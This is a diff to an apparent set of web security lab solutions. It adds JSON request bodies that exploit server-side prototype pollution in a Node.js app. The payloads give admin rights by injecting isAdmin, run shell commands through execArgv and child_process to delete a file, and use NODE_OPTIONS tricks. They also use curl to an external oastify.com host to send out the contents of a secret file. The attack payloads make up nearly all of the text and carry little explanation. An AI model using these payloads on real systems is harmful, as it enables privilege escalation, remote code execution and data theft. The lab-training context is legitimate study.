@@ -38,27 +38,155 @@ This will also work `data:application/javascript,alert();`, in script src `appli
 
 ## 6. Privilege escalation via server-side prototype pollution
 
+```json
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"nGHufYaWkCvezfEZYUwGvWrdP6blmQup",
+   "__proto__":{
+      "isAdmin":true
+   }
+}
 ```
-POST /my-account/change-address HTTP/2
-Host: 0a770041032ea20f8063b86b004e00b1.web-security-academy.net
-Cookie: session=nGHufYaWkCvezfEZYUwGvWrdP6blmQup
-Content-Length: 202
-Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
-Sec-Ch-Ua-Platform: "Windows"
-Sec-Ch-Ua-Mobile: ?0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
-Content-Type: application/json;charset=UTF-8
-Accept: */*
-Origin: https://0a770041032ea20f8063b86b004e00b1.web-security-academy.net
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://0a770041032ea20f8063b86b004e00b1.web-security-academy.net/my-account?id=wiener
-Accept-Encoding: gzip, deflate, br
-Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
-Priority: u=1, i
 
-{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"nGHufYaWkCvezfEZYUwGvWrdP6blmQup",
-	"__proto__":{"isAdmin":true}
+
+## 7. Detecting server-side prototype pollution without polluted property reflection
+
+```json
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"qe4dINvBU5R5Rz0pt9O9ZtGoAa8eWgi8",
+   "__proto__":{
+      "json spaces":" "
+   }
+}
+```
+
+## 8. Bypassing flawed input filters for server-side prototype pollution
+
+```json
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK1",
+   "sessionId":"xEwc8d0PHFUSwN3XLikllHwzEpSYqccn",
+   "constructor":{
+      "prototype":{
+         "isAdmin":true
+      }
+   }
+}
+```
+
+
+## 9. Remote code execution via server-side prototype pollution
+
+```json
+POST /my-account/change-address HTTP/2
+
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"5gojfKVIjmRUwaG2znvIFf8LAc1IRPeH",
+   "__proto__":{
+      "isAdmin":true
+   }
+}
+```
+
+```json
+POST /my-account/change-address HTTP/2
+
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"5gojfKVIjmRUwaG2znvIFf8LAc1IRPeH",
+   "__proto__":{
+      "execArgv":[
+         "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+      ]
+   }
+}
+```
+
+```json
+POST /admin/jobs HTTP/2
+
+{
+   "csrf":"BGejyzzug1SH0LzmFsdzdeRlQaOuvAHQ",
+   "sessionId":"5gojfKVIjmRUwaG2znvIFf8LAc1IRPeH",
+   "tasks":[
+      "db-cleanup",
+      "fs-cleanup"
+   ]
+}
+```
+
+
+## 10. Exfiltrating sensitive data via server-side prototype pollution
+
+Detection in case eval fails
+
+```json
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"bNZesQjFZZawevt71JvHjMzpSKwzbRaA",
+   "__proto__":{
+      "argv0":"node",
+      "shell":"node",
+      "NODE_OPTIONS":"--inspect=6bi8v0nohyji8gont93nhgi3augm4gs5.oastify.com"
+   }
+}
+```
+
+```json
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"ZdGdRt2Y5f3hDOgpIx2IwlKcSX0L5tud",
+   "__proto__":{
+      "shell":"/proc/self/exe",
+      "argv0":"console.log(require('child_process').execSync('curl oldq5ix6rgt0iyy53rd5ryslkcq5ew2l.oastify.com').toString())//",
+      "NODE_OPTIONS":"--require /proc/self/cmdline"
+   }
+}
+```
+
+
+```json
+{
+   "address_line_1":"Wiener HQ",
+   "address_line_2":"One Wiener Way",
+   "city":"Wienerville",
+   "postcode":"BU1 1RP",
+   "country":"UK",
+   "sessionId":"ZdGdRt2Y5f3hDOgpIx2IwlKcSX0L5tud",
+   "__proto__":{
+      "shell":"/proc/self/exe",
+      "argv0":"console.log(require('child_process').execSync('curl -X POST http://oldq5ix6rgt0iyy53rd5ryslkcq5ew2l.oastify.com -d \"$(cat ./secret)\"').toString())//",
+      "NODE_OPTIONS":"--require /proc/self/cmdline"
+   }
 }
 ```
